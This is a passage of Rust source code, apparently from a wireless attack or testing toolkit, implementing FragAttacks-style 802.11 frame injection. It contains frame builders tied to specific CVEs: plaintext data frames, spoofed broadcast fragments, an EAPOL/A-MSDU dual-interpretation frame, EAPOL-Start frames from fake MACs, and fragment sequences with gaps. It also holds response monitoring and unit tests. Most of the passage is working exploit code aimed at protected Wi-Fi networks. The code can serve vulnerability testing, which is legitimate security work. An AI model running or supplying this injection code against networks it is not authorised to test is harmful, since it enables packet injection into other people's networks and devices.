            // we send both plaintext to test if the receiver accepts mixed fragments.
            let payload = build_icmp_payload(&params.inject_dst_ip);
            let fragments = fragment_payload(our_mac, bssid, &payload, params.fragment_size);
            for frag in &fragments {
                if !is_running_check(shared, frag, &tx_opts) {
                    break;
                }
                sent += 1;
                if params.fragment_delay > Duration::ZERO {
                    thread::sleep(params.fragment_delay);
                }
            }
        }

        // Design flaw tests — require MitM, placeholder for now
        FragVariant::AmsduInject | FragVariant::MixedKey | FragVariant::CacheAttack => {
            // These require dual-adapter MitM setup.
            // When the MitM engine is implemented:
            // AmsduInject: intercept frame, flip QoS bit 7, craft A-MSDU subframes
            // MixedKey: inject frag under old key, trigger rekey, verify reassembly
            // CacheAttack: inject frag, trigger reconnect, monitor cache behavior
            push_event(events, attack_start, FragEventKind::Error {
                message: format!("{}: MitM engine required but not yet available", variant.label()),
            });
        }
    }

    // Update info counters
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.elapsed = info.start_time.elapsed();
    }

    sent
}

/// Helper: check running flag and transmit frame.
fn is_running_check(shared: &SharedAdapter, frame: &[u8], opts: &TxOptions) -> bool {
    shared.tx_frame(frame, opts).is_ok()
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Response monitoring
// ═══════════════════════════════════════════════════════════════════════════════

/// Monitor for a response that proves the target processed our injected frame.
///
/// Looks for:
/// - ICMP echo reply (most common indicator)
/// - Any data frame from the target addressed to us (generic catch)
///
/// Returns Some(frames_received_count) if response detected, None if timeout.
fn monitor_response(
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    variant: FragVariant,
    params: &FragParams,
    running: &Arc<AtomicBool>,
    info: &Arc<Mutex<FragInfo>>,
) -> Option<u64> {
    let deadline = Instant::now() + params.response_wait;
    let mut received: u64 = 0;

    while running.load(Ordering::SeqCst) {
        let now = Instant::now();
        if now >= deadline {
            return None;
        }

        let remaining = deadline - now;
        let rx_timeout = remaining.min(params.rx_poll_timeout);

        match reader.recv_timeout(rx_timeout) {
            Some(frame) => {
                received += 1;
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.frames_received += 1;
                    info.elapsed = info.start_time.elapsed();
                }

                // Check if this is a response to our injection
                if is_response_frame(&frame.raw, &target.bssid, variant) {
                    return Some(received);
                }
            }
            None => continue,
        }
    }

    None
}

/// Check if a received frame is a response to our injection.
///
/// For most tests, we look for ICMP echo reply in a data frame from the AP.
/// For EAPOL forwarding test, we look for EAPOL frames from other stations.
fn is_response_frame(data: &[u8], bssid: &MacAddress, variant: FragVariant) -> bool {
    // Minimum frame: 24-byte header + LLC/SNAP (8) + IP header (20) + ICMP (8) = 60
    if data.len() < 34 {
        return false;
    }

    // Must be a data frame
    let fc_low = data[0];
    let frame_type_val = (fc_low >> 2) & 0x03;
    if frame_type_val != 2 {
        // Not a data frame
        return false;
    }

    // Check it's from the target AP (addr2 or addr3 matches BSSID)
    let addr2 = &data[10..16];
    let addr3 = &data[16..22];
    let bssid_bytes = bssid.as_bytes();
    let from_ap = addr2 == bssid_bytes || addr3 == bssid_bytes;
    if !from_ap {
        return false;
    }

    // For EAPOL forwarding test, look for any EAPOL frame
    if variant == FragVariant::EapolForward {
        let has_qos = (fc_low >> 4) & 0x0F >= 8;
        let hdr_len = if has_qos { 26 } else { 24 };
        if data.len() > hdr_len + 8 {
            let payload = &data[hdr_len..];
            // Check for LLC/SNAP + EAPOL EtherType (0x888E)
            if payload.len() >= 8
                && payload[0] == 0xAA && payload[1] == 0xAA && payload[2] == 0x03
                && payload[3] == 0x00 && payload[4] == 0x00 && payload[5] == 0x00
                && payload[6] == 0x88 && payload[7] == 0x8E
            {
                return true;
            }
        }
        return false;
    }

    // For all other tests: look for any data frame from AP that could be
    // an ICMP echo reply or other response. In a real test environment,
    // we'd parse IP+ICMP headers. For now, any data frame from AP after
    // our injection counts as a potential response.
    //
    // More specific: check for LLC/SNAP + IPv4 + ICMP echo reply
    let has_qos = (fc_low >> 4) & 0x0F >= 8;
    let hdr_len = if has_qos { 26 } else { 24 };
    if data.len() > hdr_len + 8 + 20 + 8 {
        let payload = &data[hdr_len..];
        // LLC/SNAP header check
        if payload.len() >= 8
            && payload[0] == 0xAA && payload[1] == 0xAA && payload[2] == 0x03
            && payload[3] == 0x00 && payload[4] == 0x00 && payload[5] == 0x00
            && payload[6] == 0x08 && payload[7] == 0x00  // IPv4 EtherType
        {
            let ip = &payload[8..];
            // IP protocol field (offset 9) == 1 means ICMP
            if ip.len() > 20 && ip[9] == 1 {
                let icmp = &ip[20..];
                // ICMP type 0 = Echo Reply
                if !icmp.is_empty() && icmp[0] == 0 {
                    return true;
                }
            }
        }
    }

    false
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Frame crafting helpers
// ═══════════════════════════════════════════════════════════════════════════════

/// Build a minimal ICMP echo request payload (for embedding in frames).
///
/// Returns: LLC/SNAP + IPv4 + ICMP echo request.
fn build_icmp_payload(dst_ip: &[u8; 4]) -> Vec<u8> {
    let mut payload = Vec::with_capacity(64);

    // LLC/SNAP header (8 bytes)
    payload.extend_from_slice(&[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00]);
    payload.extend_from_slice(&[0x08, 0x00]); // IPv4 EtherType

    // IPv4 header (20 bytes, no options)
    let total_len: u16 = 20 + 8 + 4; // IP header + ICMP header + 4 bytes data
    payload.push(0x45); // version=4, IHL=5
    payload.push(0x00); // DSCP/ECN
    payload.extend_from_slice(&total_len.to_be_bytes()); // total length
    payload.extend_from_slice(&[0x00, 0x01]); // identification
    payload.extend_from_slice(&[0x00, 0x00]); // flags + fragment offset
    payload.push(64); // TTL
    payload.push(1);  // protocol = ICMP
    payload.extend_from_slice(&[0x00, 0x00]); // checksum (skip for test)
    payload.extend_from_slice(&[192, 168, 1, 100]); // src IP (fake)
    payload.extend_from_slice(dst_ip); // dst IP

    // ICMP echo request (8 bytes header + 4 bytes data)
    payload.push(8);    // type = Echo Request
    payload.push(0);    // code
    payload.extend_from_slice(&[0x00, 0x00]); // checksum (skip for test)
    payload.extend_from_slice(&[0x00, 0x01]); // identifier
    payload.extend_from_slice(&[0x00, 0x01]); // sequence number
    payload.extend_from_slice(&[0xDE, 0xAD, 0xBE, 0xEF]); // data (marker)

    payload
}

/// Build a plaintext data frame with ICMP ping payload.
/// CVE-2020-26140: Plaintext data acceptance in protected network.
fn build_plaintext_data(src: &MacAddress, bssid: &MacAddress, dst_ip: &[u8; 4]) -> Vec<u8> {
    let payload = build_icmp_payload(dst_ip);
    let mut frame = Vec::with_capacity(24 + payload.len());

    // Frame Control: Data frame (type=2, subtype=0), ToDS=1
    frame.push(0x08); // type=2 (data), subtype=0
    frame.push(0x01); // ToDS=1

    // Duration
    frame.extend_from_slice(&[0x00, 0x00]);

    // Addr1 = BSSID (receiver)
    frame.extend_from_slice(bssid.as_bytes());
    // Addr2 = SA (transmitter)
    frame.extend_from_slice(src.as_bytes());
    // Addr3 = DA (destination = broadcast for ping test)
    frame.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);

    // Sequence control (will be set by hardware/driver)
    frame.extend_from_slice(&[0x00, 0x00]);

    // Payload (LLC/SNAP + IP + ICMP)
    frame.extend_from_slice(&payload);

    frame
}

/// Build a broadcast fragment containing ICMP payload.
/// CVE-2020-26145: Plaintext broadcast fragments processed as full frames.
fn build_broadcast_fragment(bssid: &MacAddress, dst_ip: &[u8; 4]) -> Vec<u8> {
    let payload = build_icmp_payload(dst_ip);
    let mut frame = Vec::with_capacity(24 + payload.len());

    // Frame Control: Data frame, FromDS=1
    frame.push(0x08); // type=2 (data), subtype=0
    frame.push(0x02); // FromDS=1

    // Duration
    frame.extend_from_slice(&[0x00, 0x00]);

    // Addr1 = DA (broadcast)
    frame.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    // Addr2 = BSSID (transmitter, spoofed)
    frame.extend_from_slice(bssid.as_bytes());
    // Addr3 = SA (source, spoofed)
    frame.extend_from_slice(bssid.as_bytes());

    // Sequence control: fragment 1 (frag=1, more_frags=0)
    // This makes it look like the second fragment of a pair,
    // but sent as a standalone broadcast fragment
    let seq_ctrl: u16 = (42 << 4) | 1; // seq=42, frag=1
    frame.extend_from_slice(&seq_ctrl.to_le_bytes());

    // Payload
    frame.extend_from_slice(&payload);

    frame
}

/// Build EAPOL A-MSDU injection frame.
/// CVE-2020-26144: Exploit the LLC/SNAP + EAPOL + A-MSDU dual-interpretation.
///
/// First 8 bytes of payload are simultaneously valid as:
/// - LLC/SNAP header: AA AA 03 00 00 00 88 8E (EAPOL EtherType)
/// - A-MSDU subframe header: DA=AA:AA:03:00:00:00, SA starts with 88:8E
fn build_eapol_amsdu(src: &MacAddress, bssid: &MacAddress, dst_ip: &[u8; 4]) -> Vec<u8> {
    let icmp = build_icmp_payload(dst_ip);

    // Build the frame with QoS header + A-MSDU flag
    let mut frame = Vec::with_capacity(26 + 8 + 14 + icmp.len() + 14 + icmp.len());

    // Frame Control: QoS Data (subtype=8), ToDS=1
    frame.push(0x88); // type=2 (data), subtype=8 (QoS)
    frame.push(0x01); // ToDS=1

    // Duration
    frame.extend_from_slice(&[0x00, 0x00]);

    // Addr1 = BSSID
    frame.extend_from_slice(bssid.as_bytes());
    // Addr2 = SA
    frame.extend_from_slice(src.as_bytes());
    // Addr3 = DA (broadcast)
    frame.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);

    // Sequence control
    frame.extend_from_slice(&[0x00, 0x00]);

    // QoS control: bit 7 = A-MSDU present
    frame.push(0x80); // A-MSDU flag set
    frame.push(0x00);

    // First A-MSDU subframe header (dual-valid as LLC/SNAP + EAPOL)
    // DA: AA:AA:03:00:00:00 (also looks like LLC/SNAP OUI)
    frame.extend_from_slice(&[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00]);
    // SA: 88:8E:xx:xx:xx:xx (88 8E looks like EAPOL EtherType in LLC/SNAP)
    frame.extend_from_slice(&[0x88, 0x8E, 0x00, 0x00, 0x00, 0x00]);
    // Length of first subframe MSDU (minimal — 1 byte)
    frame.extend_from_slice(&1u16.to_be_bytes());
    // MSDU data (minimal)
    frame.push(0x00);
    // Padding to 4-byte boundary
    let pad = (4 - ((6 + 6 + 2 + 1) % 4)) % 4;
    for _ in 0..pad {
        frame.push(0x00);
    }

    // Second A-MSDU subframe: contains the actual injected packet
    // DA: broadcast
    frame.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    // SA: our MAC
    frame.extend_from_slice(src.as_bytes());
    // Length
    frame.extend_from_slice(&(icmp.len() as u16).to_be_bytes());
    // MSDU: LLC/SNAP + IP + ICMP
    frame.extend_from_slice(&icmp);

    frame
}

/// Build EAPOL-Start frame from a specified MAC (for forwarding test).
/// CVE-2020-26139: Test if AP forwards EAPOL from unauthenticated senders.
fn build_eapol_start(src: &MacAddress, bssid: &MacAddress) -> Vec<u8> {
    let mut frame = Vec::with_capacity(24 + 8 + 4);

    // Frame Control: Data frame, ToDS=1
    frame.push(0x08);
    frame.push(0x01); // ToDS=1

    // Duration
    frame.extend_from_slice(&[0x00, 0x00]);

    // Addr1 = BSSID
    frame.extend_from_slice(bssid.as_bytes());
    // Addr2 = SA (fake unauthed MAC)
    frame.extend_from_slice(src.as_bytes());
    // Addr3 = DA (broadcast)
    frame.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);

    // Sequence control
    frame.extend_from_slice(&[0x00, 0x00]);

    // LLC/SNAP + EAPOL EtherType
    frame.extend_from_slice(&[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);

    // EAPOL-Start: version=2, type=1 (Start), length=0
    frame.push(0x02); // version
    frame.push(0x01); // type = Start
    frame.extend_from_slice(&[0x00, 0x00]); // length

    frame
}

/// Build a fragment-as-full frame.
/// CVE-2020-26142: Send fragment 0 with more_frags=1 containing full ICMP.
/// If target processes it as a complete frame (ignoring more_frags), it's vulnerable.
fn build_fragment_as_full(src: &MacAddress, bssid: &MacAddress, dst_ip: &[u8; 4]) -> Vec<u8> {
    let payload = build_icmp_payload(dst_ip);
    let mut frame = Vec::with_capacity(24 + payload.len());

    // Frame Control: Data frame, ToDS=1, More Fragments=1
    frame.push(0x08); // type=2 (data), subtype=0
    frame.push(0x05); // ToDS=1, More Fragments=1 (bit 2 of byte 1)

    // Duration
    frame.extend_from_slice(&[0x00, 0x00]);

    // Addr1 = BSSID
    frame.extend_from_slice(bssid.as_bytes());
    // Addr2 = SA
    frame.extend_from_slice(src.as_bytes());
    // Addr3 = DA (broadcast)
    frame.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);

    // Sequence control: seq=42, frag=0 (first fragment)
    let seq_ctrl: u16 = 42 << 4; // seq=42, frag=0
    frame.extend_from_slice(&seq_ctrl.to_le_bytes());

    // Full ICMP payload in fragment 0
    frame.extend_from_slice(&payload);

    frame
}

/// Fragment a payload into 802.11 data fragments.
///
/// Returns a vector of complete 802.11 data frames, each with proper
/// sequence control (shared sequence number, incrementing fragment number,
/// More Fragments bit set on all except last).
fn fragment_payload(
    src: &MacAddress,
    bssid: &MacAddress,
    payload: &[u8],
    frag_size: u16,
) -> Vec<Vec<u8>> {
    let frag_size = frag_size as usize;
    let num_frags = (payload.len() + frag_size - 1) / frag_size;
    let seq_num: u16 = 42; // Fixed sequence number for test
    let mut fragments = Vec::with_capacity(num_frags);

    for i in 0..num_frags {
        let start = i * frag_size;
        let end = (start + frag_size).min(payload.len());
        let is_last = i == num_frags - 1;

        let mut frame = Vec::with_capacity(24 + (end - start));

        // Frame Control: Data, ToDS=1, More Fragments if not last
        frame.push(0x08); // type=2 (data), subtype=0
        if is_last {
            frame.push(0x01); // ToDS=1
        } else {
            frame.push(0x05); // ToDS=1, More Fragments=1
        }

        // Duration
        frame.extend_from_slice(&[0x00, 0x00]);

        // Addr1 = BSSID, Addr2 = SA, Addr3 = DA (broadcast)
        frame.extend_from_slice(bssid.as_bytes());
        frame.extend_from_slice(src.as_bytes());
        frame.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);

        // Sequence control: shared seq number, incrementing frag number
        let seq_ctrl: u16 = (seq_num << 4) | (i as u16 & 0x0F);
        frame.extend_from_slice(&seq_ctrl.to_le_bytes());

        // Fragment payload
        frame.extend_from_slice(&payload[start..end]);

        fragments.push(frame);
    }

    fragments
}

/// Fragment payload with non-consecutive PN gap.
/// CVE-2020-26146: Same as fragment_payload but PN gap metadata is encoded
/// in the sequence control to simulate non-consecutive packet numbers.
fn fragment_payload_with_pn_gap(
    src: &MacAddress,
    bssid: &MacAddress,
    payload: &[u8],
    frag_size: u16,
    pn_increment: u8,
) -> Vec<Vec<u8>> {
    // The actual PN is in the CCMP header, which we can't set in plaintext frames.
    // For testing, we still fragment normally — the PN gap test is meaningful
    // only when we have the PTK and can encrypt. For now, we test if the receiver
    // accepts fragmented plaintext with non-standard sequence numbers.
    let frag_size = frag_size as usize;
    let num_frags = (payload.len() + frag_size - 1) / frag_size;
    let seq_num: u16 = 42;
    let mut fragments = Vec::with_capacity(num_frags);

    for i in 0..num_frags {
        let start = i * frag_size;
        let end = (start + frag_size).min(payload.len());
        let is_last = i == num_frags - 1;

        let mut frame = Vec::with_capacity(24 + (end - start));

        frame.push(0x08);
        if is_last {
            frame.push(0x01);
        } else {
            frame.push(0x05);
        }

        frame.extend_from_slice(&[0x00, 0x00]);
        frame.extend_from_slice(bssid.as_bytes());
        frame.extend_from_slice(src.as_bytes());
        frame.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);

        // Non-consecutive fragment numbering: 0, pn_increment, 2*pn_increment...
        let frag_num = (i as u16) * (pn_increment as u16);
        let seq_ctrl: u16 = (seq_num << 4) | (frag_num & 0x0F);
        frame.extend_from_slice(&seq_ctrl.to_le_bytes());

        frame.extend_from_slice(&payload[start..end]);
        fragments.push(frame);
    }

    fragments
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════════════════════════

fn push_event(
    events: &Arc<EventRing<FragEvent>>,
    start: Instant,
    kind: FragEventKind,
) {
    let seq = events.seq() + 1;
    events.push(FragEvent {
        seq,
        timestamp: start.elapsed(),
        kind,
    });
}

#[allow(dead_code)]
fn update_phase(info: &Arc<Mutex<FragInfo>>, phase: FragPhase) {
    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
    info.phase = phase;
    info.elapsed = info.start_time.elapsed();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_frag_params_default() {
        let params = FragParams::default();
        assert_eq!(params.fragment_size, 200);
        assert_eq!(params.fragment_count, 2);
        assert_eq!(params.fragment_delay, Duration::ZERO);
        assert_eq!(params.pn_increment, 2);
        assert_eq!(params.test_timeout, Duration::from_secs(10));
        assert_eq!(params.response_wait, Duration::from_secs(5));
        assert_eq!(params.retry_count, 3);
        assert_eq!(params.retry_delay, Duration::from_secs(1));
        assert_eq!(params.channel_settle, Duration::from_millis(50));
        assert_eq!(params.timeout, Duration::ZERO);
        assert!(params.variant.is_none());
        assert_eq!(params.mode, FragMode::Test);
        assert!(!params.stop_on_first_vuln);
        assert!(params.skip_unsupported);
        assert!(params.broadcast_tests);
    }

    #[test]
    fn test_frag_info_default() {
        let info = FragInfo::default();
        assert_eq!(info.phase, FragPhase::Idle);
        assert!(!info.running);
        assert_eq!(info.variants_tested, 0);
        assert_eq!(info.variants_vulnerable, 0);
        assert_eq!(info.frames_sent, 0);
        assert_eq!(info.frames_received, 0);
        assert!(info.results.is_empty());
    }

    #[test]
    fn test_variant_parse() {
        assert_eq!(FragVariant::from_str("amsdu"), Some(FragVariant::AmsduInject));
        assert_eq!(FragVariant::from_str("cve-2020-24588"), Some(FragVariant::AmsduInject));
        assert_eq!(FragVariant::from_str("24588"), Some(FragVariant::AmsduInject));
        assert_eq!(FragVariant::from_str("plaintext"), Some(FragVariant::PlaintextFull));
        assert_eq!(FragVariant::from_str("frag-full"), Some(FragVariant::FragAsFull));
        assert_eq!(FragVariant::from_str("noncons-pn"), Some(FragVariant::NonconsecPn));
        assert_eq!(FragVariant::from_str("mixed-enc"), Some(FragVariant::MixedPlainEnc));
        assert_eq!(FragVariant::from_str("garbage"), None);
    }

    #[test]
    fn test_variant_all_count() {
        assert_eq!(FragVariant::all().len(), 12);
        assert_eq!(FragVariant::injection_only().len(), 9);
    }

    #[test]
    fn test_variant_cve_strings() {
        for variant in FragVariant::all() {
            let cve = variant.cve();
            assert!(cve.starts_with("CVE-2020-2"));
            assert!(!variant.label().is_empty());
            assert!(!variant.description().is_empty());
        }
    }

    #[test]
    fn test_variant_mitm_classification() {
        // Exactly 3 design flaws require MitM
        let mitm_count = FragVariant::all().iter().filter(|v| v.requires_mitm()).count();
        assert_eq!(mitm_count, 3);
        assert!(FragVariant::AmsduInject.requires_mitm());
        assert!(FragVariant::MixedKey.requires_mitm());
        assert!(FragVariant::CacheAttack.requires_mitm());
        assert!(!FragVariant::PlaintextFull.requires_mitm());
    }

    #[test]
    fn test_variant_design_flaw_classification() {
        let design_flaws: Vec<_> = FragVariant::all().iter().filter(|v| v.is_design_flaw()).collect();
        assert_eq!(design_flaws.len(), 3);
    }

    #[test]
    fn test_frag_attack_new() {
        let attack = FragAttack::new(FragParams::default());
        assert!(!attack.is_running());
        assert!(!attack.is_done());
        assert_eq!(attack.name(), "frag");
        let info = attack.info();
        assert_eq!(info.phase, FragPhase::Idle);
        assert!(!info.running);
    }

    #[test]
    fn test_frag_event_ring() {
        let ring = EventRing::<FragEvent>::new(16);
        ring.push(FragEvent {
            seq: 1,
            timestamp: Duration::from_millis(100),
            kind: FragEventKind::ChannelLocked { channel: 6 },
        });
        ring.push(FragEvent {
            seq: 2,
            timestamp: Duration::from_millis(500),
            kind: FragEventKind::TestStarted {
                variant: FragVariant::PlaintextFull,
                index: 1,
                total: 12,
            },
        });
        let events = ring.drain();
        assert_eq!(events.len(), 2);
        assert_eq!(events[0].seq, 1);
    }

    #[test]
    fn test_build_icmp_payload() {
        let payload = build_icmp_payload(&[8, 8, 8, 8]);
        // LLC/SNAP (8) + IP header (20) + ICMP (8+4) = 40
        assert_eq!(payload.len(), 40);
        // LLC/SNAP header
        assert_eq!(&payload[0..8], &[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00]);
        // IP version = 4, IHL = 5
        assert_eq!(payload[8], 0x45);
        // IP protocol = ICMP (1)
        assert_eq!(payload[17], 1);
        // Dst IP
        assert_eq!(&payload[24..28], &[8, 8, 8, 8]);
        // ICMP type = Echo Request (8)
        assert_eq!(payload[28], 8);
        // Marker data
        assert_eq!(&payload[36..40], &[0xDE, 0xAD, 0xBE, 0xEF]);
    }

    #[test]
    fn test_build_plaintext_data() {
        let src = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let frame = build_plaintext_data(&src, &bssid, &[8, 8, 8, 8]);
        // 24 bytes header + 40 bytes payload
        assert_eq!(frame.len(), 64);
        // Frame Control: Data, ToDS
        assert_eq!(frame[0], 0x08);
        assert_eq!(frame[1], 0x01);
        // Addr1 = BSSID
        assert_eq!(&frame[4..10], bssid.as_bytes());
        // Addr2 = SA
        assert_eq!(&frame[10..16], src.as_bytes());
    }

    #[test]
    fn test_build_eapol_amsdu_dual_valid() {
        let src = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let frame = build_eapol_amsdu(&src, &bssid, &[8, 8, 8, 8]);
        // QoS Data frame
        assert_eq!(frame[0], 0x88);
        // QoS control byte has A-MSDU flag (bit 7)
        assert_eq!(frame[24] & 0x80, 0x80);
        // First A-MSDU subframe DA = AA:AA:03:00:00:00 (= LLC/SNAP OUI)
        assert_eq!(&frame[26..32], &[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00]);
        // SA starts with 88:8E (= EAPOL EtherType)
        assert_eq!(&frame[32..34], &[0x88, 0x8E]);
    }

    #[test]
    fn test_build_eapol_start() {
        let src = MacAddress::new([0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01]);
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let frame = build_eapol_start(&src, &bssid);
        // Header (24) + LLC/SNAP (8) + EAPOL-Start (4) = 36
        assert_eq!(frame.len(), 36);
        // LLC/SNAP + EAPOL EtherType
        assert_eq!(&frame[24..32], &[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);
        // EAPOL-Start: version=2, type=1
        assert_eq!(frame[32], 0x02);
        assert_eq!(frame[33], 0x01);
    }

    #[test]
    fn test_build_fragment_as_full() {
        let src = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let frame = build_fragment_as_full(&src, &bssid, &[8, 8, 8, 8]);
        // More Fragments bit should be set
        assert_eq!(frame[1] & 0x04, 0x04);
        // Fragment number should be 0
        let seq_ctrl = u16::from_le_bytes([frame[22], frame[23]]);
        assert_eq!(seq_ctrl & 0x0F, 0); // frag num = 0
        // Should contain full ICMP payload
        assert_eq!(frame.len(), 64); // 24 header + 40 payload
    }

    #[test]
    fn test_fragment_payload() {
        let src = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let payload = vec![0xAA; 100];
        let frags = fragment_payload(&src, &bssid, &payload, 50);
        assert_eq!(frags.len(), 2);

        // First fragment: More Fragments set
        assert_eq!(frags[0][1] & 0x04, 0x04);
        let seq0 = u16::from_le_bytes([frags[0][22], frags[0][23]]);
        assert_eq!(seq0 & 0x0F, 0); // frag=0

        // Last fragment: More Fragments clear
        assert_eq!(frags[1][1] & 0x04, 0x00);
        let seq1 = u16::from_le_bytes([frags[1][22], frags[1][23]]);
        assert_eq!(seq1 & 0x0F, 1); // frag=1

        // Same sequence number
        assert_eq!(seq0 >> 4, seq1 >> 4);
    }

    #[test]
    fn test_fragment_payload_with_pn_gap() {
        let src = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let payload = vec![0xBB; 100];
        let frags = fragment_payload_with_pn_gap(&src, &bssid, &payload, 50, 3);
        assert_eq!(frags.len(), 2);

        let seq0 = u16::from_le_bytes([frags[0][22], frags[0][23]]);
        let seq1 = u16::from_le_bytes([frags[1][22], frags[1][23]]);
        assert_eq!(seq0 & 0x0F, 0); // frag=0
        assert_eq!(seq1 & 0x0F, 3); // frag=3 (gap of 3)
    }

    #[test]
    fn test_is_response_frame_icmp_reply() {
        // Build a fake ICMP echo reply data frame from AP
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let mut frame = vec![0u8; 24 + 8 + 20 + 8 + 1];
        frame[0] = 0x08; // Data frame
        frame[1] = 0x02; // FromDS
        // Addr2 = BSSID
        frame[10..16].copy_from_slice(bssid.as_bytes());
        // LLC/SNAP + IPv4
        let hdr = 24;
        frame[hdr] = 0xAA; frame[hdr+1] = 0xAA; frame[hdr+2] = 0x03;
        frame[hdr+3] = 0x00; frame[hdr+4] = 0x00; frame[hdr+5] = 0x00;
        frame[hdr+6] = 0x08; frame[hdr+7] = 0x00; // IPv4
        // IP header: protocol = ICMP
        frame[hdr+8] = 0x45; // version+IHL
        frame[hdr+17] = 1;   // protocol = ICMP
        // ICMP: type = 0 (Echo Reply)
        frame[hdr+28] = 0;

        assert!(is_response_frame(&frame, &bssid, FragVariant::PlaintextFull));
    }

    #[test]
    fn test_is_response_frame_wrong_type() {
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        // Management frame (not data)
        let mut frame = vec![0u8; 60];
        frame[0] = 0x80; // Beacon
        frame[10..16].copy_from_slice(bssid.as_bytes());
        assert!(!is_response_frame(&frame, &bssid, FragVariant::PlaintextFull));
    }

    #[test]
    fn test_is_response_frame_eapol_forward() {
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let mut frame = vec![0u8; 24 + 8 + 4];
        frame[0] = 0x08; // Data frame
        frame[1] = 0x02; // FromDS
        frame[10..16].copy_from_slice(bssid.as_bytes());
        // LLC/SNAP + EAPOL
        let hdr = 24;
        frame[hdr] = 0xAA; frame[hdr+1] = 0xAA; frame[hdr+2] = 0x03;
        frame[hdr+3] = 0x00; frame[hdr+4] = 0x00; frame[hdr+5] = 0x00;
        frame[hdr+6] = 0x88; frame[hdr+7] = 0x8E;

        assert!(is_response_frame(&frame, &bssid, FragVariant::EapolForward));
        assert!(!is_response_frame(&frame, &bssid, FragVariant::PlaintextFull));
    }

    #[test]
    fn test_frag_test_result_new() {
        let result = FragTestResult::new(FragVariant::PlaintextFull);
        assert_eq!(result.variant, FragVariant::PlaintextFull);
        assert_eq!(result.verdict, FragVerdict::Pending);
        assert_eq!(result.frames_sent, 0);
        assert_eq!(result.frames_received, 0);
        assert!(result.detail.is_empty());
    }

    #[test]
    fn test_broadcast_fragment_structure() {
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let frame = build_broadcast_fragment(&bssid, &[8, 8, 8, 8]);
        // FromDS bit set
        assert_eq!(frame[1] & 0x02, 0x02);
        // Addr1 = broadcast
        assert_eq!(&frame[4..10], &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
        // Addr2 = BSSID (spoofed)
        assert_eq!(&frame[10..16], bssid.as_bytes());
        // Fragment number = 1
        let seq_ctrl = u16::from_le_bytes([frame[22], frame[23]]);
        assert_eq!(seq_ctrl & 0x0F, 1);
    }
}
